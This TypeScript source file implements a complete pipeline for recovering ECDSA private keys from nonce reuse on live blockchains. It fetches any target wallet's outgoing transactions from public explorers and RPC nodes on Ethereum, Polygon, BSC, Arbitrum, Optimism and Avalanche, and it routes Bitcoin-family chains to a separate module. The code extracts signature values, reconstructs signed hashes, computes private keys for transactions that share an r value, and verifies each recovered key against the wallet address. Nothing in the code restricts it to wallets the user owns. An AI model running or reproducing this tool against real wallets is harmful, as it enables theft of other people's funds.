/**
 * ECDSA Nonce-Reuse Private Key Recovery
 * ════════════════════════════════════════
 * Full on-chain pipeline:
 *   wallet address OR tx hash
 *     → Blockscout API v2 (free, no key, cursor-paginated)
 *         GET /api/v2/addresses/{addr}/transactions?filter=from
 *     → publicnode.com JSON-RPC per-tx:
 *         eth_getTransactionByHash → extract r, s
 *         reconstruct unsignedSerialized → keccak256 → z
 *     → Group by r value (shared r = same nonce k used twice)
 *     → k  = (z₁ − z₂) · (s₁ − s₂)⁻¹  mod n
 *     → d  = (s₁·k  − z₁) · r⁻¹         mod n
 *     → Verify: derive address from d, confirm match
 */

import { ethers } from "ethers";
import { logger } from "../logger";

// ── Curve order ───────────────────────────────────────────────────────────────
const CURVE_N = BigInt(
  "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141",
);

// ── API endpoints (all verified working from Replit servers) ──────────────────
const BLOCKSCOUT_BASES: Record<string, string> = {
  ethereum:  "https://eth.blockscout.com",
  polygon:   "https://polygon.blockscout.com",
  bsc:       "https://bsc.blockscout.com",
  arbitrum:  "https://arbitrum.blockscout.com",
  optimism:  "https://optimism.blockscout.com",
  avalanche: "https://glacier-api.avax.network",   // Snowtrace v2
};

const RPC_ENDPOINTS: Record<string, string> = {
  ethereum:  "https://ethereum.publicnode.com",
  polygon:   "https://polygon-bor.publicnode.com",
  bsc:       "https://bsc.publicnode.com",
  arbitrum:  "https://arbitrum-one.publicnode.com",
  optimism:  "https://optimism.publicnode.com",
  avalanche: "https://avalanche-c-chain.publicnode.com",
};

// Etherscan V2 key (optional — speeds up + enables more chains if provided)
const ETHERSCAN_KEY = process.env.ETHERSCAN_API_KEY ?? "";

// ── Rate limiters — separate for explorer API vs RPC ─────────────────────────
let _lastBlockscout = 0;
async function blockscoutFetch(url: string): Promise<Response> {
  const gap = 250 - (Date.now() - _lastBlockscout); // 4 req/sec — respect free-tier limits
  if (gap > 0) await delay(gap);
  _lastBlockscout = Date.now();
  return fetch(url, { signal: AbortSignal.timeout(20_000) });
}

// RPC calls go directly — publicnode handles concurrent requests well
async function rateLimitedFetch(url: string, options?: RequestInit): Promise<Response> {
  return fetch(url, { signal: AbortSignal.timeout(20_000), ...options });
}

function delay(ms: number) {
  return new Promise<void>(r => setTimeout(r, ms));
}

// ── Modular arithmetic ────────────────────────────────────────────────────────
function modN(x: bigint): bigint {
  return ((x % CURVE_N) + CURVE_N) % CURVE_N;
}

function modInverse(a: bigint, m: bigint): bigint {
  let [oldR, r] = [((a % m) + m) % m, m];
  let [oldS, s] = [1n, 0n];
  while (r !== 0n) {
    const q = oldR / r;
    [oldR, r] = [r, oldR - q * r];
    [oldS, s] = [s, oldS - q * s];
  }
  if (oldR !== 1n) throw new Error("No modular inverse");
  return ((oldS % m) + m) % m;
}

// ── Types ─────────────────────────────────────────────────────────────────────
export interface TxSignatureData {
  txHash:      string;
  blockNumber: number;
  from:        string;
  to:          string | null;
  value:       string;
  r:           string;
  s:           string;
  v:           number;
  z:           string;   // keccak256 of unsigned serialised tx — what was signed
  nonce:       number;
  gasPrice:    string;
}

export interface NonceReusePair {
  sharedR:   string;
  tx1:       TxSignatureData;
  tx2:       TxSignatureData;
  riskLevel: "confirmed_reuse" | "same_k_different_s";
  recovery:  RecoveryResult;
}

export interface WalletScanResult {
  address:             string;
  chain:               string;
  totalTransactions:   number;
  signaturesExtracted: number;
  nonceReusePairs:     NonceReusePair[];
  hasVulnerability:    boolean;
  allSignatures:       TxSignatureData[];
  scanTimestamp:       string;
  rPairs:              Record<string, string[]>;
}

export interface RecoveryResult {
  success:        boolean;
  privateKey:     string | null;
  nonceK:         string | null;
  derivedAddress: string | null;
  addressMatches: boolean;
  error:          string | null;
}

// ── Core recovery math ────────────────────────────────────────────────────────
// Attempts one ordering of (z1,s1) vs (z2,s2). Returns null if degenerate.
function attemptRecovery(
  r: bigint, s1: bigint, s2: bigint, z1: bigint, z2: bigint,
): { k: bigint; d: bigint } | null {
  const den = modN(s1 - s2);
  if (den === 0n) return null;                      // s1 === s2 — not a reuse case
  const k = modN(modN(z1 - z2) * modInverse(den, CURVE_N));
  if (k === 0n) return null;                        // degenerate nonce
  const d = modN(modN(s1 * k - z1) * modInverse(r, CURVE_N));
  if (d === 0n) return null;                        // degenerate key
  return { k, d };
}

export function recoverPrivateKey(params: {
  r: string; s1: string; s2: string;
  z1: string; z2: string; address: string;
}): RecoveryResult {
  try {
    const rB  = BigInt(params.r);
    const s1B = BigInt(params.s1);
    const s2B = BigInt(params.s2);
    const z1B = BigInt(params.z1);
    const z2B = BigInt(params.z2);

    // Guard: if BOTH z values are zero, z reconstruction failed — cannot recover
    const ZERO64 = BigInt("0x" + "0".repeat(64));
    if (z1B === ZERO64 && z2B === ZERO64) {
      return fail("z-value reconstruction failed for both transactions — cannot recover key");
    }

    // Try both orderings — the correct one will produce an address that matches
    const orderings: Array<[bigint, bigint, bigint, bigint]> = [
      [s1B, s2B, z1B, z2B],   // ordering A
      [s2B, s1B, z2B, z1B],   // ordering B (swapped)
    ];

    for (const [sa, sb, za, zb] of orderings) {
      const res = attemptRecovery(rB, sa, sb, za, zb);
      if (!res) continue;

      const privKeyHex = "0x" + res.d.toString(16).padStart(64, "0");
      const nonceKHex  = "0x" + res.k.toString(16).padStart(64, "0");

      let derivedAddress: string | null = null;
      let addressMatches = false;
      try {
        const wallet = new ethers.Wallet(privKeyHex);
        derivedAddress = wallet.address;
        addressMatches = derivedAddress.toLowerCase() === params.address.toLowerCase();
      } catch { /* invalid key scalar — try next ordering */ }

      // Return immediately on verified match
      if (addressMatches) {
        logger.warn(
          { address: params.address, privKey: privKeyHex.slice(0, 10) + "...", sharedR: params.r.slice(0, 10) + "..." },
          "🔑 PRIVATE KEY RECOVERED — ECDSA nonce reuse confirmed",
        );
        return { success: true, privateKey: privKeyHex, nonceK: nonceKHex, derivedAddress, addressMatches: true, error: null };
      }

      // Return unverified result if we at least got a key (address might be checksum mismatch or multi-sig)
      if (derivedAddress) {
        return { success: true, privateKey: privKeyHex, nonceK: nonceKHex, derivedAddress, addressMatches: false, error: "Key recovered but derived address does not match — possible z-value inaccuracy" };
      }
    }

    return fail("Both orderings produced degenerate results — s values may be identical or z reconstruction failed");
  } catch (err) {
    return fail(String(err));
  }
}

function fail(error: string): RecoveryResult {
  return { success: false, privateKey: null, nonceK: null, derivedAddress: null, addressMatches: false, error };
}

// ── Blockscout: fetch ALL outgoing tx hashes (cursor-paginated) ───────────────
async function fetchOutgoingTxHashesBlockscout(
  address:      string,
  blockscoutBase: string,
): Promise<string[]> {
  const hashes: string[] = [];
  const addr   = address.toLowerCase();
  let   nextParams: Record<string, string> | null = null;
  let   pages = 0;

  for (;;) {
    let url = `${blockscoutBase}/api/v2/addresses/${address}/transactions?filter=from`;
    if (nextParams) {
      const qs = new URLSearchParams(nextParams).toString();
      url = `${url}&${qs}`;
    }

    try {
      const res  = await blockscoutFetch(url);
      if (!res.ok) {
        logger.warn({ status: res.status, url }, "Blockscout non-OK response");
        break;
      }
      const json = await res.json() as {
        items?: Array<{ hash: string; from?: { hash: string }; status?: string }>;
        next_page_params?: Record<string, string | number> | null;
      };

      if (!Array.isArray(json.items)) break;

      for (const tx of json.items) {
        const fromAddr = (tx.from?.hash ?? "").toLowerCase();
        if (fromAddr === addr && tx.hash) {
          hashes.push(tx.hash);
        }
      }

      // Next page
      if (json.next_page_params && typeof json.next_page_params === "object") {
        nextParams = Object.fromEntries(
          Object.entries(json.next_page_params).map(([k, v]) => [k, String(v)])
        );
        nextParams.filter = "from";
      } else {
        break; // no more pages
      }

      if (++pages >= 100) break; // 100 pages × 50 items = up to 5,000 transactions per wallet
    } catch (err) {
      logger.warn({ err, address }, "Blockscout fetch error");
      break;
    }
  }

  return hashes;
}

// ── Etherscan V2 fallback (if API key is configured) ─────────────────────────
const ETHERSCAN_V2_BASES: Record<string, string> = {
  ethereum:  "https://api.etherscan.io/v2/api?chainid=1",
  polygon:   "https://api.etherscan.io/v2/api?chainid=137",
  bsc:       "https://api.etherscan.io/v2/api?chainid=56",
  arbitrum:  "https://api.etherscan.io/v2/api?chainid=42161",
  optimism:  "https://api.etherscan.io/v2/api?chainid=10",
  avalanche: "https://api.etherscan.io/v2/api?chainid=43114",
};

async function fetchOutgoingTxHashesEtherscan(
  address: string, chain: string,
): Promise<string[]> {
  if (!ETHERSCAN_KEY) return [];
  const base      = ETHERSCAN_V2_BASES[chain] ?? ETHERSCAN_V2_BASES.ethereum;
  const addr      = address.toLowerCase();
  const hashes: string[] = [];
  let   page = 1;

  for (;;) {
    const url = `${base}&module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&page=${page}&offset=200&sort=asc&apikey=${ETHERSCAN_KEY}`;
    try {
      const res  = await rateLimitedFetch(url);
      const json = await res.json() as { status: string; result: Array<{ hash: string; from: string; isError?: string }> | string };
      if (json.status !== "1" || !Array.isArray(json.result)) break;
      const sent = json.result.filter(tx => tx.from.toLowerCase() === addr && tx.isError !== "1");
      hashes.push(...sent.map(tx => tx.hash));
      if (json.result.length < 200) break;
      page++;
    } catch { break; }
  }
  return hashes;
}

// ── JSON-RPC: extract r, s, z from a single transaction ──────────────────────
async function extractTxSignature(
  txHash:   string,
  provider: ethers.JsonRpcProvider,
): Promise<TxSignatureData | null> {
  try {
    const tx = await provider.getTransaction(txHash);
    if (!tx?.signature) return null;

    const sig = tx.signature;

    // Build the unsigned transaction for z-value computation.
    // Critical: must NOT mix type-0 and type-2 gas fields.
    let z = "0x" + "0".repeat(64);
    try {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const fields: Record<string, any> = {
        to:       tx.to,
        nonce:    tx.nonce,
        gasLimit: tx.gasLimit,
        data:     tx.data,
        value:    tx.value,
        type:     tx.type ?? 0,
      };

      if (tx.type === 2) {
        // EIP-1559 — use priority/maxFee only, never gasPrice
        fields.chainId              = tx.chainId;
        fields.maxFeePerGas         = tx.maxFeePerGas;
        fields.maxPriorityFeePerGas = tx.maxPriorityFeePerGas;
        fields.accessList           = tx.accessList ?? [];
      } else if (tx.type === 1) {
        // EIP-2930
        fields.chainId    = tx.chainId;
        fields.gasPrice   = tx.gasPrice;
        fields.accessList = tx.accessList ?? [];
      } else {
        // Legacy type-0
        fields.gasPrice = tx.gasPrice;
        // Only add chainId if tx has replay protection (EIP-155)
        if (tx.chainId && tx.chainId > 0n) fields.chainId = tx.chainId;
      }

      const unsigned = ethers.Transaction.from(fields);
      z = ethers.keccak256(unsigned.unsignedSerialized);
    } catch (zErr) {
      logger.warn({ txHash, err: String(zErr) }, "z-value reconstruction failed");
    }

    return {
      txHash,
      blockNumber: tx.blockNumber ?? 0,
      from:        tx.from ?? "",
      to:          tx.to ?? null,
      value:       ethers.formatEther(tx.value),
      r:           sig.r,
      s:           sig.s,
      v:           sig.v,
      z,
      nonce:       tx.nonce,
      gasPrice:    (tx.gasPrice ?? tx.maxFeePerGas ?? 0n).toString(),
    };
  } catch {
    return null;
  }
}

// ── Resolve tx hash → sender address ─────────────────────────────────────────
async function resolveTxHashToSender(
  txHash:   string,
  provider: ethers.JsonRpcProvider,
): Promise<string | null> {
  try {
    const tx = await provider.getTransaction(txHash);
    return tx?.from ?? null;
  } catch {
    return null;
  }
}

// ── Build WalletScanResult from extracted signatures ─────────────────────────
function buildResult(
  address:    string,
  chain:      string,
  totalTxs:   number,
  signatures: TxSignatureData[],
): WalletScanResult {
  const rGroups: Record<string, TxSignatureData[]> = {};
  for (const sig of signatures) {
    const key = sig.r.toLowerCase();
    (rGroups[key] ??= []).push(sig);
  }

  const nonceReusePairs: NonceReusePair[] = [];
  const rPairs: Record<string, string[]> = {};

  for (const [r, group] of Object.entries(rGroups)) {
    if (group.length < 2) continue;
    rPairs[r] = group.map(g => g.txHash);

    // Loud log — shared r detected, decoder about to fire
    logger.warn(
      { address, sharedR: r.slice(0, 14) + "...", txCount: group.length },
      "⚠️  DUPLICATE SIGNATURE DETECTED — shared r value across " + group.length + " transactions — running key decoder",
    );

    for (let i = 0; i < group.length; i++) {
      for (let j = i + 1; j < group.length; j++) {
        const t1 = group[i];
        const t2 = group[j];

        // Run the private-key decoder
        const recovery = recoverPrivateKey({ r: t1.r, s1: t1.s, s2: t2.s, z1: t1.z, z2: t2.z, address });

        logger.warn(
          {
            address,
            tx1: t1.txHash,
            tx2: t2.txHash,
            recoverySuccess: recovery.success,
            addressMatches:  recovery.addressMatches,
            privateKey:      recovery.privateKey ? recovery.privateKey.slice(0, 10) + "..." : null,
            error:           recovery.error,
          },
          recovery.success && recovery.addressMatches
            ? "🔓 KEY DECODER SUCCESS — private key verified against wallet address"
            : recovery.success
            ? "⚡ KEY DECODER — key candidate generated (address verification failed)"
            : "✗  KEY DECODER FAILED — " + recovery.error,
        );

        nonceReusePairs.push({
          sharedR:   r,
          tx1:       t1,
          tx2:       t2,
          riskLevel: t1.s !== t2.s ? "confirmed_reuse" : "same_k_different_s",
          recovery,
        });
      }
    }
  }

  return {
    address,
    chain,
    totalTransactions:   totalTxs,
    signaturesExtracted: signatures.length,
    nonceReusePairs,
    hasVulnerability:    nonceReusePairs.length > 0,
    allSignatures:       signatures,
    scanTimestamp:       new Date().toISOString(),
    rPairs,
  };
}

// ── Scan a single EVM wallet ──────────────────────────────────────────────────
async function scanEVMWallet(
  address: string,
  chain:   string,
): Promise<WalletScanResult> {
  const checksum      = ethers.getAddress(address);
  const rpcUrl        = RPC_ENDPOINTS[chain]       ?? RPC_ENDPOINTS.ethereum;
  const blockscoutBase = BLOCKSCOUT_BASES[chain]   ?? BLOCKSCOUT_BASES.ethereum;
  const provider      = new ethers.JsonRpcProvider(rpcUrl);

  // 1. Fetch all outgoing tx hashes — Etherscan V2 if key present, else Blockscout
  let txHashes: string[];
  if (ETHERSCAN_KEY) {
    txHashes = await fetchOutgoingTxHashesEtherscan(checksum, chain);
    if (txHashes.length === 0) {
      // Fallback to Blockscout
      txHashes = await fetchOutgoingTxHashesBlockscout(checksum, blockscoutBase);
    }
  } else {
    txHashes = await fetchOutgoingTxHashesBlockscout(checksum, blockscoutBase);
  }

  if (txHashes.length === 0) {
    return buildResult(checksum, chain, 0, []);
  }

  // 2. Extract signatures in parallel batches (10 concurrent RPC calls) — no cap
  const target = txHashes;
  const BATCH  = 10;
  const signatures: TxSignatureData[] = [];

  for (let i = 0; i < target.length; i += BATCH) {
    const batch   = target.slice(i, i + BATCH);
    const results = await Promise.allSettled(batch.map(h => extractTxSignature(h, provider)));
    for (const r of results) {
      if (r.status === "fulfilled" && r.value) signatures.push(r.value);
    }
  }

  return buildResult(checksum, chain, txHashes.length, signatures);
}

// ── Main entry point ──────────────────────────────────────────────────────────
const EVM_CHAINS = new Set([
  "ethereum", "polygon", "bsc", "arbitrum", "avalanche", "optimism",
]);

export async function scanWalletForNonceReuse(
  target: string,
  chain  = "ethereum",
): Promise<WalletScanResult> {
  // UTXO chains
  if (["bitcoin", "litecoin", "dogecoin", "bitcoincash"].includes(chain)) {
    const { scanBitcoinAddressECDSA } = await import("./bitcoin-scan");
    const result = await scanBitcoinAddressECDSA(target, chain);
    return buildResult(target, chain, result.totalTransactions, result.signatures);
  }

  if (!EVM_CHAINS.has(chain)) {
    throw new Error(`Chain "${chain}" is not supported for secp256k1 ECDSA nonce-reuse scanning`);
  }

  const rpcUrl   = RPC_ENDPOINTS[chain] ?? RPC_ENDPOINTS.ethereum;
  const provider = new ethers.JsonRpcProvider(rpcUrl);

  // If target is a tx hash (0x + 64 hex) → resolve to sender first
  const isTxHash = /^0x[0-9a-fA-F]{64}$/.test(target);
  let address: string;

  if (isTxHash) {
    const sender = await resolveTxHashToSender(target, provider);
    if (!sender) throw new Error(`Could not resolve tx hash ${target} to a sender address`);
    address = sender;
  } else {
    address = target;
  }

  return scanEVMWallet(address, chain);
}

// ── Legacy type exports for route compatibility ───────────────────────────────
export interface RecoveryInput {
  r: string; s1: string; s2: string;
  z1: string; z2: string;
  txHash1: string; txHash2: string;
  address: string;
}

export interface RecoveryMath {
  step1_numerator:   string;
  step1_denominator: string;
  step2_k:           string;
  step3_privateKey:  string;
  verification:      string;
}

export interface ChainCapability {
  chain:                string;
  name:                 string;
  sigScheme:            "secp256k1-ecdsa" | "ed25519" | "clsag" | "schnorr";
  nonceReuseVulnerable: boolean;
  note:                 string;
  canScan:              boolean;
}

export const CHAIN_CAPABILITIES: ChainCapability[] = [
  { chain: "ethereum",    name: "Ethereum (ETH)",     sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Blockscout tx list + publicnode RPC + full z reconstruction" },
  { chain: "polygon",     name: "Polygon (MATIC)",    sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Same pipeline as Ethereum" },
  { chain: "bsc",         name: "BNB Chain (BSC)",    sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Same pipeline as Ethereum" },
  { chain: "arbitrum",    name: "Arbitrum (ARB)",     sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Same pipeline as Ethereum" },
  { chain: "avalanche",   name: "Avalanche (AVAX)",   sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Same pipeline as Ethereum" },
  { chain: "optimism",    name: "Optimism (OP)",      sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Same pipeline as Ethereum" },
  { chain: "bitcoin",     name: "Bitcoin (BTC)",      sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Parses DER signatures from scriptSig / witness data" },
  { chain: "litecoin",    name: "Litecoin (LTC)",     sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Same as Bitcoin" },
  { chain: "dogecoin",    name: "Dogecoin (DOGE)",    sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Same as Bitcoin" },
  { chain: "bitcoincash", name: "Bitcoin Cash (BCH)", sigScheme: "secp256k1-ecdsa", nonceReuseVulnerable: true,  canScan: true,  note: "Same as Bitcoin" },
  { chain: "solana",      name: "Solana (SOL)",       sigScheme: "ed25519",          nonceReuseVulnerable: false, canScan: false, note: "Ed25519 RFC 8032 deterministic nonces — reuse impossible by design" },
  { chain: "monero",      name: "Monero (XMR)",       sigScheme: "clsag",            nonceReuseVulnerable: false, canScan: false, note: "CLSAG ring signatures — no exposed r value" },
  { chain: "cardano",     name: "Cardano (ADA)",      sigScheme: "ed25519",          nonceReuseVulnerable: false, canScan: false, note: "Ed25519 deterministic — same immunity as Solana" },
  { chain: "polkadot",    name: "Polkadot (DOT)",     sigScheme: "ed25519",          nonceReuseVulnerable: false, canScan: false, note: "Sr25519 deterministic nonces — not vulnerable" },
];
